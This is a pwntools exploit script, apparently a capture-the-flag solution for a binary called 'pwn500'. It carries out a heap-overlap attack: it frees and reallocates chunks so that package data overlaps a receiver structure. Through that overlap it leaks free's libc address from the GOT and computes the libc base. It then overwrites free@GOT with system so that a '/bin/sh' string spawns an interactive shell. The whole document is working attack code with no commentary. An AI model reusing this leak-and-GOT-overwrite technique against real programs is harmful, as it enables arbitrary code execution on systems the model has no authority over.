from pwn import *

context.log_level = 'debug'
#context.aslr = False

io = process('./pwn500')
e = ELF('./pwn500')
libc = e.libc

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)

def set_sender_info():
	answer('your choice :','1')
	answer('name?','/bin/sh\x00')
	answer('contact?','AAAA')

def new_recv():
	answer('your choice :','2')

def show():
	answer('your choice :','5')

def edit(idx, name, postcodes, contact, address ):
	answer('your choice :','3')
	answer('edit?', str(idx))
	answer('name?', name)
	answer('postcodes?', postcodes)
	answer('contact?', contact)
	answer('address?', address)

# ===================================

def set_recv_info():
	answer('your choice :','1')
	answer('?','AAAA')
	answer('?','AAAA')
	answer('?','AAAA')
	answer('?','AAAA')
	
def new_pkg(buf, size, newline = True):
	answer('your choice :','2')
	answer('?', str(size))
	answer('~', buf, newline)

def del_pkg(idx):
	answer('your choice :','3')
	answer('?', str(idx))

def exit_recv():
	answer('your choice :','6')

def save_recv():
	answer('your choice :','5')

answer('?', 'y')

set_sender_info()

new_recv()

set_recv_info()
new_pkg('AAAA', 0x80)
new_pkg('BBBB', 0x1f0)
new_pkg('CCCC', 0x100) # 0x98, 0x208, 0x118

del_pkg(0) # [0x98], 0x208, 0x118
del_pkg(1) # [0x98], [0x208], 0x118
new_pkg('A'*0x80, 0x80, False) # 0x98, [0x200, 0x8], 0x118

new_pkg('BBBB', 0x90) # 0x98, 0xA8, [], 0x118 
set_recv_info() #  0x98, 0xA8, (0xB8), [], 0x118
save_recv() 

new_recv() 
set_recv_info()  

del_pkg(1) # 0x98, [0xA8], (0xb8, ...), 0x100
del_pkg(1) # 0x98, [0xA8], [(0xb8, ...)], [0x100]

payload = 'C'* 0x90
payload += 'D'*0x8 # size
payload += p64(e.got['free'] - 0x10)
payload += 'E'*0x40

new_pkg(payload, 0x1f0)  # overlap recv_info here!!
exit_recv()

show()
io.recvuntil("======receiver[1]=======")
io.recvuntil("name:")
buf = io.recvuntil('\n')[:-1]
buf = buf.ljust(8, '\x00')
free_addr = u64(buf)
log.success('buf:%#x'% free_addr)

libc.address = free_addr - libc.symbols['free']

io.recvuntil('postcodes:')
buf2 = io.recvuntil('\n')[:-1]
log.success('buf2:%#x' % u64(buf2.ljust(8, '\x00')))

io.recvuntil('contact:')
buf3 = io.recvuntil('\n')[:-1]
log.success('buf3:%#x' % u64(buf3.ljust(8, '\x00')))

io.recvuntil('address:')
buf4 = io.recvuntil('\n')[:-1]
log.success('buf4:%#x' % u64(buf4.ljust(8, '\x00')))

edit(1, p64(libc.symbols['system'])[:6], buf2, buf3, buf4)

answer('choice :', '6')

io.interactive()

